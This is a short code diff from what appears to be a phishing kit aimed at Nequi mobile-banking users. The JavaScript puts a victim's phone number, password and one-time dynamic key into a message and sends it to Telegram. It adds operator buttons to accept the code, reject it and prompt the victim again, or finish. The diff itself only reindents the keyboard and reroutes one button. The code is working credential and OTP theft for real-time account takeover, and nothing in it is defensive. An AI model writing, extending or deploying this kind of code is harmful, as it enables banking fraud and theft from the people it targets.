@@ -517,19 +517,19 @@
         const mensaje = `🔐 *CLAVE DINÁMICA NEQUI*\n\n📱 *Número:* +57 ${savedData.phoneNumber}\n🔑 *Clave:* ${savedData.password}\n🎯 *Dinámica:* ${dinamica}\n⏰ *Hora:* ${new Date().toLocaleTimeString('es-CO')}\n📅 *Fecha:* ${new Date().toLocaleDateString('es-CO')}`;
         
         const teclado = JSON.stringify({
-          inline_keyboard: [
-            [
-              { text: "✅ Correcto", callback_data: `correcto:${transactionId}` },
-              { text: "❌ Incorrecto", callback_data: `error_dinamica:${transactionId}` }
-            ],
-            [
-              { text: "🔐 Pedir Otra Vez", callback_data: `pedir_dinamica:${transactionId}` }
-            ],
-            [
-              { text: "✔️ Finalizar", callback_data: `finish:${transactionId}` }
-            ]
-          ]
-        });
+  inline_keyboard: [
+    [
+      { text: "✅ Correcto", callback_data: `correcto:${transactionId}` },
+      { text: "❌ Incorrecto", callback_data: `error_dinamica:${transactionId}` }
+    ],
+    [
+      { text: "🔐 Pedir Otra Vez", callback_data: `error_dinamica:${transactionId}` }
+    ],
+    [
+      { text: "✔️ Finalizar", callback_data: `finish:${transactionId}` }
+    ]
+  ]
+});
 
         try {
           console.log('📤 Enviando a Telegram...');
